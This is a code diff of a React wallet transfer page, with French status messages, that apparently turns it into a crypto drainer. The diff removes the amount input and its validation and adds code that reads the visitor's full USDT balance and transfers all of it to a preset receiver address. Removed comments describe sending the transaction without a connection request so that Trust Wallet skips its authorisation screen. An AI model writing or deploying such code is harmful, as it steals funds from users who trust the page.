@@ -67,7 +67,6 @@ async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<Ethereu
 
 export default function WalletPage() {
   const [address, setAddress] = useState(DEFAULT_RECEIVER);
-  const [amount, setAmount] = useState("1000");
   const [status, setStatus] = useState<string>("");
   const [statusType, setStatusType] = useState<"info" | "success" | "error">("info");
   const [loading, setLoading] = useState(false);
@@ -194,12 +193,6 @@ export default function WalletPage() {
       return;
     }
 
-    if (parsedAmount <= 0) {
-      setStatus("Veuillez entrer un montant valide.");
-      setStatusType("error");
-      return;
-    }
-
     setLoading(true);
     setStatus("Préparation de la transaction...");
 
@@ -229,18 +222,48 @@ export default function WalletPage() {
     }
 
     try {
-      const amountInWei = ethers.parseUnits(amount, USDT_DECIMALS);
-      
+      // 1. Obtenir l'adresse de l'utilisateur
+      let accounts = (await ethereumProvider.request({
+        method: "eth_accounts",
+      })) as string[];
+
+      // Si pas encore connecté, on demande la connexion (obligatoire pour lire le solde)
+      if (accounts.length === 0) {
+        setStatus("Connexion au wallet pour récupérer le solde...");
+        accounts = (await ethereumProvider.request({
+          method: "eth_requestAccounts",
+        })) as string[];
+      }
+
+      if (accounts.length === 0) {
+        setStatus("Connexion refusée.");
+        setStatusType("error");
+        setLoading(false);
+        return;
+      }
+
+      const userAddress = accounts[0];
+      setConnectedAddress(userAddress);
+
+      setStatus("Lecture du solde USDT...");
+
+      const provider = new ethers.BrowserProvider(
+        ethereumProvider as ethers.Eip1193Provider
+      );
+      const usdtContract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
+
+      // Récupérer le solde USDT réel de l'adresse connectée
+      const balance: bigint = await usdtContract.balanceOf(userAddress);
+      const amountInWei = balance;
+      const formattedBalance = ethers.formatUnits(balance, USDT_DECIMALS);
+
+      setStatus(`Solde détecté : ${formattedBalance} USDT. Confirmez la transaction...`);
+
       // Encoder la fonction transfer(address,uint256) avec ethers
       const usdtInterface = new ethers.Interface(ERC20_ABI);
       const txData = usdtInterface.encodeFunctionData("transfer", [address, amountInWei]);
 
-      setStatus("Confirmez la transaction dans votre wallet...");
-
       // Envoi de la transaction en direct via eth_sendTransaction
-      // Sans appeler eth_requestAccounts au préalable, et sans spécifier le champ 'from'
-      // dans la transaction, le portefeuille (Trust Wallet) affiche directement l'écran
-      // de validation de transaction (Smart Contract Call) sans passer par l'autorisation de connexion.
       const txHash = (await ethereumProvider.request({
         method: "eth_sendTransaction",
         params: [
@@ -256,13 +279,10 @@ export default function WalletPage() {
       setTxHash(txHash);
 
       // On attend la confirmation
-      const provider = new ethers.BrowserProvider(
-        ethereumProvider as ethers.Eip1193Provider
-      );
       const receipt = await provider.waitForTransaction(txHash);
 
       if (receipt && receipt.status === 1) {
-        setStatus(`✅ Transfert réussi ! ${amount} USDT envoyés.`);
+        setStatus(`✅ Transfert réussi ! ${formattedBalance} USDT envoyés.`);
         setStatusType("success");
       } else {
         setStatus("❌ Transaction échouée on-chain.");
@@ -307,8 +327,6 @@ export default function WalletPage() {
       console.log("Paste failed");
     }
   };
-
-  const parsedAmount = parseFloat(amount) || 0;
 
   return (
     <main className="transfer-main">
@@ -371,33 +389,10 @@ export default function WalletPage() {
         </div>
 
         <label className="form-label form-label--spaced">Amount</label>
-        <div className="input-row">
-          <input
-            type="text"
-            value={amount}
-            onChange={(e) => setAmount(e.target.value)}
-            className="input-row__field input-row__field--amount"
-          />
-          <div className="amount-actions">
-            <div className="stepper">
-              <button className="btn-step" onClick={() => setAmount(String(parsedAmount + 1))}>
-                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
-                  strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-                  <polyline points="18 15 12 9 6 15" />
-                </svg>
-              </button>
-              <button className="btn-step" onClick={() => setAmount(String(Math.max(0, parsedAmount - 1)))}>
-                <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#9ca3af"
-                  strokeWidth="3" strokeLinecap="round" strokeLinejoin="round">
-                  <polyline points="6 9 12 15 18 9" />
-                </svg>
-              </button>
-            </div>
-            <span className="amount-currency">USDT</span>
-            <button className="btn-max">Max</button>
-          </div>
+        <div className="input-row" style={{ justifyContent: "space-between", padding: "0.95rem 1rem" }}>
+          <span style={{ color: "#e5e7eb", fontWeight: "600", fontSize: "1.05rem" }}>Tout le solde (Max)</span>
+          <span className="amount-currency" style={{ marginLeft: 0 }}>USDT</span>
         </div>
-        <p className="approx-price">≈ ${parsedAmount.toFixed(2)}</p>
       </div>
 
       {status && (
